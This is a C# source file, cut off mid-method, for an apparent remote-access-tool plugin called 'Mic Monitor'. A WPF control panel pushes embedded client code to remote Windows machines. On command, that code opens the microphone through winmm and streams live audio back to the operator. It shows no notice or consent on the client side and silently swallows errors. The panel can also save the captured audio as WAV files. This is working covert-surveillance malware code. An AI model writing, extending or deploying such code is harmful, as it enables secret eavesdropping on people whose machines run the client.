// File: Plugins/Builtin/MicMonitorPlugin.cs
#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class MicMonitorPlugin : IServerPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, MicMonitorUI> _clientUIs = new();

        public string PluginId => "micmon";
        public string DisplayName => "Mic Monitor";
        public string Version => "1.0.0";
        public string Description => "Remote microphone live audio streamer.";

        public Task Initialize(PluginHost host)
        {
            _host = host;
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
            return Task.CompletedTask;
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientPlugin_micmon
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private CancellationTokenSource _cts;
        private volatile bool _recording;
        private int _deviceIndex;
        private int _sampleRate = 16000;
        private int _bitsPerSample = 16;
        private int _channels = 1;
        private int _bufferMs = 100;

        [DllImport(""winmm.dll"")]
        static extern int waveInGetNumDevs();
        [DllImport(""winmm.dll"", CharSet = CharSet.Auto)]
        static extern int waveInGetDevCaps(int deviceId, ref WAVEINCAPS caps, int size);
        [DllImport(""winmm.dll"")]
        static extern int waveInOpen(out IntPtr handle, int deviceId, ref WAVEFORMATEX format, WaveInProc callback, IntPtr instance, int flags);
        [DllImport(""winmm.dll"")]
        static extern int waveInClose(IntPtr handle);
        [DllImport(""winmm.dll"")]
        static extern int waveInStart(IntPtr handle);
        [DllImport(""winmm.dll"")]
        static extern int waveInStop(IntPtr handle);
        [DllImport(""winmm.dll"")]
        static extern int waveInReset(IntPtr handle);
        [DllImport(""winmm.dll"")]
        static extern int waveInPrepareHeader(IntPtr handle, IntPtr header, int size);
        [DllImport(""winmm.dll"")]
        static extern int waveInUnprepareHeader(IntPtr handle, IntPtr header, int size);
        [DllImport(""winmm.dll"")]
        static extern int waveInAddBuffer(IntPtr handle, IntPtr header, int size);

        delegate void WaveInProc(IntPtr handle, int msg, IntPtr instance, IntPtr param1, IntPtr param2);

        const int CALLBACK_FUNCTION = 0x00030000;
        const int MM_WIM_DATA = 0x3C4;
        const int WAVE_FORMAT_PCM = 1;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct WAVEINCAPS
        {
            public short wMid, wPid;
            public int vDriverVersion;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
            public string szPname;
            public int dwFormats;
            public short wChannels;
            public short wReserved1;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WAVEFORMATEX
        {
            public short wFormatTag;
            public short nChannels;
            public int nSamplesPerSec;
            public int nAvgBytesPerSec;
            public short nBlockAlign;
            public short wBitsPerSample;
            public short cbSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WAVEHDR
        {
            public IntPtr lpData;
            public int dwBufferLength;
            public int dwBytesRecorded;
            public IntPtr dwUser;
            public int dwFlags;
            public int dwLoops;
            public IntPtr lpNext;
            public IntPtr reserved;
        }

        IntPtr _waveIn = IntPtr.Zero;
        WaveInProc _waveInProc;
        List<IntPtr> _headers = new List<IntPtr>();
        List<IntPtr> _buffers = new List<IntPtr>();
        const int NUM_BUFFERS = 6;
        volatile int _sending;

        async Task LogA(string msg)
        {
            try
            {
                byte[] b = Encoding.UTF8.GetBytes(msg);
                byte[] m = new byte[b.Length + 1];
                m[0] = 0xFD;
                Buffer.BlockCopy(b, 0, m, 1, b.Length);
                await _send(m);
            }
            catch { }
        }

        List<string[]> GetDevices()
        {
            var list = new List<string[]>();
            try
            {
                int count = waveInGetNumDevs();
                for (int i = 0; i < count; i++)
                {
                    WAVEINCAPS caps = new WAVEINCAPS();
                    if (waveInGetDevCaps(i, ref caps, Marshal.SizeOf(typeof(WAVEINCAPS))) == 0)
                        list.Add(new string[] { i.ToString(), caps.szPname ?? (""Device "" + i) });
                }
            }
            catch { }
            return list;
        }

        async Task SendDeviceList()
        {
            var devs = GetDevices();
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < devs.Count; i++)
            {
                sb.Append(devs[i][0]);
                sb.Append(""|"");
                sb.Append(devs[i][1]);
                if (i < devs.Count - 1) sb.Append(""\n"");
            }
            byte[] ib = Encoding.UTF8.GetBytes(sb.ToString());
            byte[] msg = new byte[ib.Length + 1];
            msg[0] = 0x06;
            Buffer.BlockCopy(ib, 0, msg, 1, ib.Length);
            await _send(msg);
        }

        async Task SendAck(byte c, string m)
        {
            byte[] mb = Encoding.UTF8.GetBytes(m);
            byte[] msg = new byte[mb.Length + 2];
            msg[0] = 0xFE; msg[1] = c;
            Buffer.BlockCopy(mb, 0, msg, 2, mb.Length);
            await _send(msg);
        }

        public async Task Run(Func<byte[], Task> sendData, Func<Task<byte[]>> receiveData)
        {
            _send = sendData;
            _cts = new CancellationTokenSource();
            _waveInProc = new WaveInProc(WaveCallback);

            string initError = null;
            try
            {
                var devs = GetDevices();
                await LogA(""[INIT] Devices="" + devs.Count);
                for (int i = 0; i < devs.Count; i++)
                    await LogA(""[INIT] Dev"" + i + "": "" + devs[i][1]);
                await SendDeviceList();
            }
            catch (Exception ex) { initError = ex.GetType().Name + "": "" + ex.Message; }
            if (initError != null) { await LogA(""[INIT] FATAL: "" + initError); return; }

            var rxTask = Task.Run(async () =>
            {
                try
                {
                    while (!_cts.IsCancellationRequested)
                    {
                        byte[] data = null;
                        bool fail = false;
                        try { data = await receiveData(); } catch { fail = true; }
                        if (fail || data == null || data.Length == 0) break;
                        string err = null;
                        try { await HandleCmd(data); } catch (Exception ex) { err = ex.Message; }
                        if (err != null) await LogA(""[ERR] "" + err);
                    }
                }
                catch { }
            });

            await rxTask;
            StopRecording();
            _cts.Cancel();
        }

        async Task HandleCmd(byte[] data)
        {
            byte cmd = data[0];
            byte[] p = new byte[data.Length - 1];
            if (p.Length > 0) Buffer.BlockCopy(data, 1, p, 0, p.Length);

            switch (cmd)
            {
                case 0x01:
                    if (p.Length >= 5)
                    {
                        _deviceIndex = p[0];
                        _sampleRate = p[1] | (p[2] << 8);
                        _bufferMs = p[3] | (p[4] << 8);
                        if (_sampleRate < 8000) _sampleRate = 8000;
                        if (_sampleRate > 48000) _sampleRate = 48000;
                        if (_bufferMs < 20) _bufferMs = 20;
                        if (_bufferMs > 1000) _bufferMs = 1000;
                    }
                    StopRecording();
                    StartRecording();
                    await SendAck(0x01, ""Recording dev="" + _deviceIndex + "" rate="" + _sampleRate + "" buf="" + _bufferMs + ""ms"");
                    break;

                case 0x02:
                    StopRecording();
                    await SendAck(0x02, ""Stopped"");
                    break;

                case 0x03:
                    if (p.Length >= 2)
                    {
                        int newRate = p[0] | (p[1] << 8);
                        if (newRate >= 8000 && newRate <= 48000 && newRate != _sampleRate)
                        {
                            _sampleRate = newRate;
                            if (_recording) { StopRecording(); StartRecording(); }
                        }
                    }
                    if (p.Length >= 4)
                    {
                        int newBuf = p[2] | (p[3] << 8);
                        if (newBuf >= 20 && newBuf <= 1000 && newBuf != _bufferMs)
                        {
                            _bufferMs = newBuf;
                            if (_recording) { StopRecording(); StartRecording(); }
                        }
                    }
                    break;

                case 0x04:
                    if (p.Length >= 1)
                    {
                        _deviceIndex = p[0];
                        if (_recording)
                        {
                            StopRecording();
                            StartRecording();
                            await SendAck(0x04, ""Switched to dev="" + _deviceIndex);
                        }
                    }
                    await SendDeviceList();
                    break;

                case 0x06:
                    await SendDeviceList();
                    break;
            }
        }

        void StartRecording()
        {
            if (_recording) return;
            try
            {
                WAVEFORMATEX fmt = new WAVEFORMATEX();
                fmt.wFormatTag = WAVE_FORMAT_PCM;
                fmt.nChannels = (short)_channels;
                fmt.nSamplesPerSec = _sampleRate;
                fmt.wBitsPerSample = (short)_bitsPerSample;
                fmt.nBlockAlign = (short)(_channels * _bitsPerSample / 8);
                fmt.nAvgBytesPerSec = _sampleRate * _channels * _bitsPerSample / 8;
                fmt.cbSize = 0;

                int result = waveInOpen(out _waveIn, _deviceIndex, ref fmt, _waveInProc, IntPtr.Zero, CALLBACK_FUNCTION);
                if (result != 0)
                {
                    try
                    {
                        byte[] b = Encoding.UTF8.GetBytes(""waveInOpen failed: "" + result);
                        byte[] m = new byte[b.Length + 1];
                        m[0] = 0xFD;
                        Buffer.BlockCopy(b, 0, m, 1, b.Length);
                        _send(m).Wait(500);
                    }
                    catch { }
                    return;
                }

                int bufferSize = fmt.nAvgBytesPerSec * _bufferMs / 1000;
                int hdrSize = Marshal.SizeOf(typeof(WAVEHDR));

                for (int i = 0; i < NUM_BUFFERS; i++)
                {
                    IntPtr bufPtr = Marshal.AllocHGlobal(bufferSize);
                    IntPtr hdrPtr = Marshal.AllocHGlobal(hdrSize);

                    WAVEHDR hdr = new WAVEHDR();
                    hdr.lpData = bufPtr;
                    hdr.dwBufferLength = bufferSize;
                    hdr.dwBytesRecorded = 0;
                    hdr.dwUser = IntPtr.Zero;
                    hdr.dwFlags = 0;
                    hdr.dwLoops = 0;
                    Marshal.StructureToPtr(hdr, hdrPtr, false);
                    waveInPrepareHeader(_waveIn, hdrPtr, hdrSize);
                    waveInAddBuffer(_waveIn, hdrPtr, hdrSize);

                    _headers.Add(hdrPtr);
                    _buffers.Add(bufPtr);
                }

                _recording = true;
                waveInStart(_waveIn);
            }
            catch (Exception ex)
            {
                try
                {
                    byte[] b = Encoding.UTF8.GetBytes(""StartRecording failed: "" + ex.Message);
                    byte[] m = new byte[b.Length + 1];
                    m[0] = 0xFD;
                    Buffer.BlockCopy(b, 0, m, 1, b.Length);
                    _send(m).Wait(500);
                }
                catch { }
                StopRecording();
            }
        }

        void StopRecording()
        {
            _recording = false;
            try
            {
                if (_waveIn != IntPtr.Zero)
                {
                    waveInStop(_waveIn);
                    waveInReset(_waveIn);

                    int hdrSize = Marshal.SizeOf(typeof(WAVEHDR));
                    foreach (IntPtr h in _headers)
                    {
                        try { waveInUnprepareHeader(_waveIn, h, hdrSize); } catch { }
                        Marshal.FreeHGlobal(h);
                    }
                    foreach (IntPtr b in _buffers)
                        Marshal.FreeHGlobal(b);

                    _headers.Clear();
                    _buffers.Clear();

                    waveInClose(_waveIn);
                    _waveIn = IntPtr.Zero;
                }
            }
            catch { }
        }

        void WaveCallback(IntPtr handle, int msg, IntPtr instance, IntPtr param1, IntPtr param2)
        {
            if (msg != MM_WIM_DATA || !_recording) return;
            try
            {
                WAVEHDR hdr = (WAVEHDR)Marshal.PtrToStructure(param1, typeof(WAVEHDR));
                int recorded = hdr.dwBytesRecorded;

                if (recorded > 0)
                {
                    byte[] audio = new byte[recorded];
                    Marshal.Copy(hdr.lpData, audio, 0, recorded);

                    byte[] packet = new byte[9 + recorded];
                    packet[0] = 0x30;
                    packet[1] = (byte)(_sampleRate & 0xFF);
                    packet[2] = (byte)((_sampleRate >> 8) & 0xFF);
                    packet[3] = (byte)_bitsPerSample;
                    packet[4] = (byte)_channels;
                    packet[5] = (byte)(recorded & 0xFF);
                    packet[6] = (byte)((recorded >> 8) & 0xFF);
                    packet[7] = (byte)((recorded >> 16) & 0xFF);
                    packet[8] = (byte)((recorded >> 24) & 0xFF);
                    Buffer.BlockCopy(audio, 0, packet, 9, recorded);

                    if (Interlocked.CompareExchange(ref _sending, 0, 0) < 8)
                    {
                        Interlocked.Increment(ref _sending);
                        _send(packet).ContinueWith(delegate { Interlocked.Decrement(ref _sending); });
                    }
                }

                if (_recording && _waveIn != IntPtr.Zero)
                {
                    int hdrSize = Marshal.SizeOf(typeof(WAVEHDR));
                    waveInAddBuffer(_waveIn, param1, hdrSize);
                }
            }
            catch { }
        }
    }
}
";
        }

        public UserControl CreateUI(PluginContext context)
        {
            bool isActive = _host.IsPluginActive(context.ClientId, PluginId);
            if (!isActive)
            {
                _ = Task.Run(async () =>
                {
                    try { await _host.StartPluginForClient(context.ClientId, PluginId); }
                    catch { }
                });
            }
            var ui = new MicMonitorUI(context, _host, this);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;
            if (_clientUIs.TryGetValue(clientId, out var ui))
                ui.HandleServerData(data);
            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (_clientUIs.TryRemove(clientId, out var ui)) ui.Dispose();
            return Task.CompletedTask;
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
        }
    }

    [SupportedOSPlatform("windows")]
    public class MicMonitorUI : UserControl, IDisposable
    {
        private readonly PluginContext _context;
        private readonly PluginHost _host;
        private readonly MicMonitorPlugin _plugin;

        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        private Color BgCol => C("BackgroundColor");
        private Color SurfCol => C("SurfaceColor");
        private Color SurfLCol => C("SurfaceLightColor");
        private Color BrdCol => C("BorderColor");
        private Color TxtCol => C("TextPrimaryColor");
        private Color DimCol => C("TextSecondaryColor");
        private Color DanCol => C("DangerColor");
        private Color DanHov => C("DangerHoverColor");
        private Color OkCol => C("SuccessColor");
        private Color OkHov => C("SuccessHoverColor");
        private Color DisCol => C("ButtonBgColor");
        private Color ButtonBorderClr => C("ButtonBorderColor");
        private Color ButtonBgClr => C("ButtonBgColor");
        private Color ButtonBgHoverClr => C("ButtonBgHoverColor");

        private SolidColorBrush BgB => B("BackgroundBrush");
        private SolidColorBrush SfB => B("SurfaceBrush");
        private SolidColorBrush SlB => B("SurfaceLightBrush");
        private SolidColorBrush TxB => B("TextPrimaryBrush");
        private SolidColorBrush DmB => B("TextSecondaryBrush");
        private SolidColorBrush GnB => B("SuccessBrush");
        private SolidColorBrush BdB => B("BorderBrush");
        private SolidColorBrush DsB => B("ButtonBgBrush");

        private readonly ComboBox _devSel;
        private readonly ComboBox _rateSel;
        private readonly ComboBox _bufSel;
        private readonly Button _startBtn;
        private readonly Button _stopBtn;
        private readonly Button _saveBtn;
        private readonly TextBlock _status;
        private readonly TextBlock _levelLbl;
        private readonly TextBlock _dataRateLbl;
        private readonly Border _levelBar;
        private readonly Border _levelTrack;
        private readonly TextBox _logBox;
        private readonly Border _logBrd;
        private readonly Slider _volSlider;
        private readonly TextBlock _volLbl;
        private readonly ToggleSwitch _playTgl;

        private bool _recording;
        private bool _playback = true;
        private float _volume = 1.0f;
        private bool _disposed;
        private int _logLines;
        private bool _suppress;

        // WaveOut playback
        private IntPtr _waveOut = IntPtr.Zero;
        private WaveOutProc _waveOutProc;
        private readonly object _playLock = new();
        private int _playRate;
        private int _playBits;
        private int _playChannels;
        private bool _waveOutOpen;
        private int _pendingBuffers;
        private volatile bool _closing; // guard against callback races during close

        // Stats
        private long _totalBytes;
        private DateTime _lastDataRate = DateTime.UtcNow;
        private long _bytesSinceLastRate;
        private long _droppedFrames;

        // Latency tracking — drop frames that arrive when too many are queued
        private const int MAX_PENDING_BUFFERS = 6;

        [DllImport("winmm.dll")]
        static extern int waveOutOpen(out IntPtr handle, int deviceId, ref WAVEFORMATEX_P format, WaveOutProc callback, IntPtr instance, int flags);
        [DllImport("winmm.dll")]
        static extern int waveOutClose(IntPtr handle);
        [DllImport("winmm.dll")]
        static extern int waveOutWrite(IntPtr handle, IntPtr header, int size);
        [DllImport("winmm.dll")]
        static extern int waveOutPrepareHeader(IntPtr handle, IntPtr header, int size);
        [DllImport("winmm.dll")]
        static extern int waveOutUnprepareHeader(IntPtr handle, IntPtr header, int size);
        [DllImport("winmm.dll")]
        static extern int waveOutSetVolume(IntPtr handle, int volume);
        [DllImport("winmm.dll")]
        static extern int waveOutReset(IntPtr handle);

        delegate void WaveOutProc(IntPtr handle, int msg, IntPtr instance, IntPtr param1, IntPtr param2);
        const int CALLBACK_FUNCTION_P = 0x00030000;
        const int WOM_DONE = 0x3BD;
        const int WAVE_MAPPER = -1;

        [StructLayout(LayoutKind.Sequential)]
        struct WAVEFORMATEX_P
        {
            public short wFormatTag;
            public short nChannels;
            public int nSamplesPerSec;
            public int nAvgBytesPerSec;
            public short nBlockAlign;
            public short wBitsPerSample;
            public short cbSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WAVEHDR_P
        {
            public IntPtr lpData;
            public int dwBufferLength;
            public int dwBytesRecorded;
            public IntPtr dwUser;
            public int dwFlags;
            public int dwLoops;
            public IntPtr lpNext;
            public IntPtr reserved;
        }

        // WAV file recording
        private MemoryStream _wavStream;
        private bool _savingToFile;
        private int _wavDataLen;
        private int _wavSaveRate;
        private int _wavSaveBits;
        private int _wavSaveChannels;

        public MicMonitorUI(PluginContext ctx, PluginHost host, MicMonitorPlugin plugin)
        {
            _context = ctx; _host = host; _plugin = plugin;
            _waveOutProc = new WaveOutProc(WaveOutCallback);

            var g = new Grid();
            g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            g.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            // Row 0: Toolbar
            var tb = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(4, 3, 4, 3) };
            var tw = new StackPanel { Orientation = Orientation.Horizontal };
            _startBtn = Btn("Start", OkCol, OkHov, null); _startBtn.Click += (s, e) => DoStart();
            _stopBtn = Btn("Stop", DanCol, DanHov, null); _stopBtn.IsEnabled = false; _stopBtn.Click += (s, e) => DoStop();
            _saveBtn = Btn("Save WAV", ButtonBgClr, ButtonBgHoverClr); _saveBtn.Click += (s, e) => DoSaveWav();
            var refBtn = Btn("Refresh", ButtonBgClr, ButtonBgHoverClr); refBtn.Click += (s, e) => DoRefresh();
            tw.Children.Add(_startBtn); tw.Children.Add(_stopBtn); tw.Children.Add(Sep());
            tw.Children.Add(_saveBtn); tw.Children.Add(refBtn); tw.Children.Add(Sep());
            var lt = new ToggleSwitch("Log"); lt.IsOn = true; lt.Toggled += on => _logBrd.Visibility = on ? Visibility.Visible : Visibility.Collapsed;
            var cb = Btn("Clear", ButtonBgClr, ButtonBgHoverClr); cb.Click += (s, e) => { _logBox.Text = ""; _logLines = 0; };
            tw.Children.Add(lt); tw.Children.Add(cb);
            tb.Child = tw; Grid.SetRow(tb, 0); g.Children.Add(tb);

            // Row 1: Settings
            var sb = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(4, 2, 4, 2) };
            var sw = new WrapPanel();
            sw.Children.Add(Lbl("Device:"));
            _devSel = StyledCombo(220);
            sw.Children.Add(_devSel);
            sw.Children.Add(Lbl("Rate:"));
            _rateSel = StyledCombo(90);
            _rateSel.Items.Add(MakeComboItem("8000 Hz"));
            _rateSel.Items.Add(MakeComboItem("11025 Hz"));
            _rateSel.Items.Add(MakeComboItem("16000 Hz"));
            _rateSel.Items.Add(MakeComboItem("22050 Hz"));
            _rateSel.Items.Add(MakeComboItem("44100 Hz"));
            _rateSel.Items.Add(MakeComboItem("48000 Hz"));
            _rateSel.SelectedIndex = 2;
            sw.Children.Add(_rateSel);
            sw.Children.Add(Lbl("Buffer:"));
            _bufSel = StyledCombo(80);
            _bufSel.Items.Add(MakeComboItem("50ms"));
            _bufSel.Items.Add(MakeComboItem("100ms"));
            _bufSel.Items.Add(MakeComboItem("200ms"));
            _bufSel.Items.Add(MakeComboItem("500ms"));
            _bufSel.SelectedIndex = 1;
            sw.Children.Add(_bufSel);
            _dataRateLbl = new TextBlock { Text = "", Foreground = DmB, FontSize = 11, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(8, 2, 4, 2) };
            sw.Children.Add(_dataRateLbl);
            sb.Child = sw; Grid.SetRow(sb, 1); g.Children.Add(sb);

            // Row 2: Level meter
            var lmb = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(10, 6, 10, 6) };
            var lmp = new DockPanel();
            _levelLbl = new TextBlock { Text = "Level: --", Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Width = 80 };
            DockPanel.SetDock(_levelLbl, Dock.Left);
            _levelTrack = new Border { Background = new SolidColorBrush(DisCol), CornerRadius = new CornerRadius(4), Height = 12, Margin = new Thickness(8, 0, 0, 0) };
            _levelBar = new Border { Background = GnB, CornerRadius = new CornerRadius(4), Height = 12, HorizontalAlignment = HorizontalAlignment.Left, Width = 0 };
            _levelTrack.Child = _levelBar;
            lmp.Children.Add(_levelLbl); lmp.Children.Add(_levelTrack);
            lmb.Child = lmp; Grid.SetRow(lmb, 2); g.Children.Add(lmb);

            // Row 3: Playback controls
            var pbb = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(4, 2, 4, 2) };
            var pbw = new WrapPanel();
            _playTgl = new ToggleSwitch("Playback");
            _playTgl.IsOn = true;
            _playTgl.Toggled += on =>
            {
                _playback = on;
                if (!on) CloseWaveOut();
            };
            pbw.Children.Add(_playTgl);
            pbw.Children.Add(Sep());
            pbw.Children.Add(Lbl("Vol:"));
            _volSlider = new Slider { Width = 100, Minimum = 0, Maximum = 100, Value = 100, TickFrequency = 5, IsSnapToTickEnabled = true, Margin = new Thickness(4, 2, 4, 2), VerticalAlignment = VerticalAlignment.Center };
            _volSlider.ValueChanged += (s, e) =>
            {
                _volume = (float)_volSlider.Value / 100f;
                _volLbl.Text = ((int)_volSlider.Value) + "%";
            };
            pbw.Children.Add(_volSlider);
            _volLbl = Lbl("100%"); pbw.Children.Add(_volLbl);
            pbb.Child = pbw; Grid.SetRow(pbb, 3); g.Children.Add(pbb);

            // Row 4: Log
            _logBrd = new Border { Background = new SolidColorBrush(BgCol), BorderBrush = BdB, BorderThickness = new Thickness(0, 1, 0, 0) };
            _logBox = new TextBox
            {
                Background = new SolidColorBrush(BgCol),
                Foreground = new SolidColorBrush(OkCol),
                BorderThickness = new Thickness(0),
                FontFamily = new FontFamily("Consolas"),
                FontSize = 11,
                IsReadOnly = true,
                TextWrapping = TextWrapping.Wrap,
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                Padding = new Thickness(4),
                CaretBrush = Brushes.Transparent,
                AcceptsReturn = true,
                Style = null
            };
            _logBrd.Child = _logBox; Grid.SetRow(_logBrd, 4); g.Children.Add(_logBrd);

            // Row 5: Status
            var stb = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 1, 0, 0), Padding = new Thickness(10, 5, 10, 5) };
            _status = new TextBlock { Text = "Ready — Playback ON", Foreground = DmB, FontSize = 12 };
            stb.Child = _status; Grid.SetRow(stb, 5); g.Children.Add(stb);

            Content = g; Background = BgB;
        }

        ComboBox StyledCombo(double width)
        {
            var combo = new ComboBox
            {
                Width = width,
                Margin = new Thickness(4, 2, 8, 2),
                Background = BgB,
                Foreground = TxB,
                BorderBrush = BdB,
                FontSize = 12,
                Style = null
            };
            combo.Resources.Add(SystemColors.WindowBrushKey, BgB);
            combo.Resources.Add(SystemColors.WindowTextBrushKey, TxB);
            combo.Resources.Add(SystemColors.HighlightBrushKey, SlB);
            combo.Resources.Add(SystemColors.HighlightTextBrushKey, TxB);
            return combo;
        }

        ComboBoxItem MakeComboItem(string text)
        {
            return new ComboBoxItem
            {
                Content = text,
                Background = BgB,
                Foreground = TxB,
                FontSize = 12
            };
        }

        void Log(string m)
        {
            if (_disposed) return;
            var l = "[" + DateTime.Now.ToString("HH:mm:ss.fff") + "] " + m + "\n";
            if (!Dispatcher.CheckAccess()) Dispatcher.BeginInvoke(() => LogI(l)); else LogI(l);
        }
        void LogI(string l)
        {
            if (_disposed) return;
            _logBox.AppendText(l); _logLines++;
            if (_logLines > 300)
            {
                var t = _logBox.Text; int c = 0;
                for (int i = 0; i < 50 && c < t.Length; i++) { int n = t.IndexOf('\n', c); if (n < 0) break; c = n + 1; }
                if (c > 0) { _logBox.Text = t.Substring(c); _logLines -= 50; }
            }
            _logBox.ScrollToEnd();
        }
        void St(string t) { if (!Dispatcher.CheckAccess()) Dispatcher.BeginInvoke(() => _status.Text = t); else _status.Text = t; }

        Button Btn(string t, Color bg, Color hv, SolidColorBrush fg = null)
        {
            var nb = new SolidColorBrush(bg); var hb = new SolidColorBrush(hv);
            var bb = new SolidColorBrush(C("ButtonBorderColor")); var db = new SolidColorBrush(C("ButtonBgColor"));
            var tp = new ControlTemplate(typeof(Button));
            var bd = new FrameworkElementFactory(typeof(Border), "bd");
            bd.SetValue(Border.BackgroundProperty, nb); bd.SetValue(Border.BorderBrushProperty, bb);
            bd.SetValue(Border.BorderThicknessProperty, new Thickness(1));
            bd.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            bd.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4));
            bd.SetValue(Border.SnapsToDevicePixelsProperty, true);
            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            bd.AppendChild(cp); tp.VisualTree = bd;
            var h = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true }; h.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); tp.Triggers.Add(h);
            var p = new Trigger { Property = ButtonBase.IsPressedProperty, Value = true }; p.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); p.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd")); tp.Triggers.Add(p);
            var d = new Trigger { Property = UIElement.IsEnabledProperty, Value = false }; d.Setters.Add(new Setter(Border.BackgroundProperty, db, "bd")); d.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "cp")); tp.Triggers.Add(d);
            return new Button { Content = t, Template = tp, Foreground = fg ?? TxB, Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
        }
        TextBlock Lbl(string t) => new() { Text = t, Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(4, 2, 4, 2) };
        Border Sep() => new() { Width = 1, Background = new SolidColorBrush(C("BorderColor")), Margin = new Thickness(4, 2, 4, 2) };

        int GetSelectedRate()
        {
            switch (_rateSel.SelectedIndex)
            {
                case 0: return 8000;
                case 1: return 11025;
                case 2: return 16000;
                case 3: return 22050;
                case 4: return 44100;
                case 5: return 48000;
                default: return 16000;
            }
        }

        int GetSelectedBuffer()
        {
            switch (_bufSel.SelectedIndex)
            {
                case 0: return 50;
                case 1: return 100;
                case 2: return 200;
                case 3: return 500;
                default: return 100;
            }
        }

        async void DoStart()
        {
            int dev = Math.Max(0, _devSel.SelectedIndex);
            int rate = GetSelectedRate();
            int buf = GetSelectedBuffer();
            byte[] cmd = new byte[6];
            cmd[0] = 0x01;
            cmd[1] = (byte)dev;
            cmd[2] = (byte)(rate & 0xFF);
            cmd[3] = (byte)((rate >> 8) & 0xFF);
            cmd[4] = (byte)(buf & 0xFF);
            cmd[5] = (byte)((buf >> 8) & 0xFF);
            try { await _context.SendToClient(cmd); } catch { return; }
            _recording = true; _totalBytes = 0; _bytesSinceLastRate = 0; _droppedFrames = 0; _lastDataRate = DateTime.UtcNow;
            _startBtn.IsEnabled = false; _stopBtn.IsEnabled = true;
            St("LIVE — dev=" + dev + " rate=" + rate + " buf=" + buf + "ms");
            Log("Started live stream: device=" + dev + ", rate=" + rate + "Hz, buffer=" + buf + "ms");
        }

        async void DoStop()
        {
            _recording = false;
            try { await _context.SendToClient(new byte[] { 0x02 }); } catch { }
            _startBtn.IsEnabled = true; _stopBtn.IsEnabled = false;
            CloseWaveOut();
            St("Stopped.");
            Log("Recording stopped. Dropped frames: " + _droppedFrames);
        }

        async void DoRefresh()
        {
            try { await _context.SendToClient(new byte[] { 0x06 }); } catch { }
        }

        void DoSaveWav()
        {
            if (!_savingToFile)
            {
                _wavStream = new MemoryStream();
                _wavDataLen = 0;
                _wavSaveRate = 0;
                _wavSaveBits = 0;
                _wavSaveChannels = 0;
                _savingToFile = true;
                _saveBtn.Content = "Stop & Save";
                Log("Recording to WAV buffer started...");
                return;
            }

            _savingToFile = false;
            _saveBtn.Content = "Save WAV";
            if (_wavStream == null || _wavDataLen == 0) { Log("No audio data captured."); return; }

            int saveRate = _wavSaveRate > 0 ? _wavSaveRate : 16000;
            int saveBits = _wavSaveBits > 0 ? _wavSaveBits : 16;
            int saveCh = _wavSaveChannels > 0 ? _wavSaveChannels : 1;

            var d = new Microsoft.Win32.SaveFileDialog
            {
                FileName = "mic_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".wav",
                Filter = "WAV|*.wav"
            };
            if (d.ShowDialog() != true) { _wavStream.Dispose(); _wavStream = null; return; }

            try
            {
                using var fs = new FileStream(d.FileName, FileMode.Create);
                WriteWavFile(fs, _wavStream.ToArray(), saveRate, saveBits, saveCh);
                Log("Saved WAV: " + d.FileName + " (" + _wavDataLen + " bytes audio, " + saveRate + "Hz)");
            }
            catch (Exception ex) { Log("Save error: " + ex.Message); }
